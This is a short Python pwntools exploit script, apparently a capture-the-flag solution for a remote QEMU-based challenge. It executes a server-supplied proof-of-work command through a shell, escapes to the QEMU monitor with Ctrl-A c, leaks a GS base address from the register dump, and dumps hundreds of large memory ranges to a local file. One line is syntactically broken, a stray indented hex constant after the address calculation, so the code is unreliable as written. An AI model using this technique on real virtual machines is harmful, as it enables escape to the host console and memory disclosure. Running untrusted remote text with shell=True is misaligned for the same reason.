from pwn import *
import subprocess
import re

io = remote("be.ax", 32578)

io.recvuntil("work:")

command = io.recvline().rstrip()

print("command: ", command)

process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = process.communicate()

print(stdout)

io.sendlineafter("solution:", stdout)

io.recvuntil("$")

io.send('\x01' + 'c')

io.sendline("info registers")

bla = io.recvuntil("XMM14")

gs_address = re.search(r'GS =\S+ (\S+)'.encode(), bla)

if gs_address:
    print(gs_address.group(1))

heap_leak = int(gs_address.group(1), 0x10)

addr= heap_leak - 0x400000
                  0x1b3000

io.recvuntil("(qemu)")

leak = ""

with open("leaks", "wb+") as f:

    for i in range(300):
        io.sendline(f"x/10000gx {addr}")
        leak = io.recvuntil("(qemu)")
        f.write(leak)
        addr += 10000*8;


io.interactive()

